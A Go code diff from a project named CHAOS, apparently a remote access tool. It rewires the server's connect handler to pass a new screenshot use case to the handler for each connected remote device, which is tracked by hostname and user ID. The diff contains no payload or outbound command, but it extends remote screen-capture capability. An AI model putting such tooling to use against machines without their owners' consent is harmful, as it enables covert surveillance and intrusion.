@@ -9,6 +9,8 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/handler"
 	"github.com/tiagorlampert/CHAOS/internal/handler/client"
 	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
+	"github.com/tiagorlampert/CHAOS/internal/usecase"
+	"github.com/tiagorlampert/CHAOS/internal/usecase/screenshot"
 	c "github.com/tiagorlampert/CHAOS/pkg/color"
 	"github.com/tiagorlampert/CHAOS/pkg/models"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
@@ -138,8 +140,14 @@ func (server *ServerHandler) connect(v []string) {
 	}
 	defer device.Connection.Close()
 
-	clientHandler := client.NewClientHandler(device.Connection)
-	clientHandler.HandleConnection(device.Hostname, device.UserID)
+	// Use Case
+	screenshot := screenshot.NewScreenshotUseCase(device.Connection)
+
+	useCase := usecase.UseCase{
+		Screenshot: screenshot,
+	}
+
+	client.NewClientHandler(device.Connection, &useCase).HandleConnection(device.Hostname, device.UserID)
 }
 
 func getDeviceByIndex(devices map[string]*models.Device, vIndex string) (*models.Device, error) {
